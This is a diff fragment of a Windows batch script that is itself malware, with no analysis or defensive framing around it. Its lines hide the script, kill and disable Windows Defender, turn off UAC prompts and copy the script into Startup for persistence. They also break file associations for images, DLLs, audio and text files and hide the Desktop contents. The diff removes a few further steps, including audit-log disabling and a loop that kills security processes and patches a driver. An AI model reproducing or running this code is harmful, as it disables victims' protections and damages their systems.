@@ -5,14 +5,11 @@ attrib +s +h +i +l +x +a "%0" >nul
 taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
 sc config WinDefend start= disabled >nul
 sc stop WinDefend >nul
-auditpol /set /category:* /success:disable /failure:disable >nul
-wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
-set /a "pid=0" && for /f "tokens=2" %%i in ('tasklist ^| findstr /i "ekrn msmpeng"') do (set pid=%%i && if !pid! NEQ 0 (taskkill /f /pid !pid! >nul && call :PATCH_DRIVER !pid!))
 wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 copy %0 "C:\Windows\Tasks\bat.bat" >nul
@@ -36,8 +33,6 @@ assoc .jpg=.xDDD
 assoc .dll=.xDDD
 assoc .mp3=.xDDD
 assoc .bmp=.xDDD
-assoc .zip=.xDDD
-assoc .rar=.xDDD
 assoc .png=.xDDD
 assoc .txt=.xDDD
 attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
